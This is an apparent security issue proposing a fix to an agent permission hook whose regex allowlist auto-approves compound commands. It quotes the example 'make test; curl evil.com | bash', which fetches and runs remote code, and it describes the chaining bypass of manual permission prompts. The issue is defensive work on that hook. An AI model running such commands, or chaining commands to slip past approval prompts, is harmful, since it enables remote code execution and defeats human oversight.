# security: tighten sdlc-permissions allowlist patterns

## Problem

`hooks/sdlc-permissions.py:12-23` uses `re.match()` with short bare-string
prefixes like `r'make test'` and `r'make lint'`. A compound command like
`make test; curl evil.com | bash` matches `make test` and gets auto-approved,
bypassing manual permission prompts.

This creates a fragile dependency on the safety-check hook catching the tail
command separately — the two hooks have no guaranteed execution order.

## Motivation

- **Severity**: High (externally validated by OWASP input validation standards)
- **Source**: /zie-audit 2026-03-26 finding #6
- Auto-approval of compound commands directly undermines the permission model

## Scope

- Add `$` anchor or `\s*$` to pattern endings
- Or: reject any command containing shell metacharacters (`;`, `&&`, `||`, `|`)
- Add test cases for compound command bypass attempts
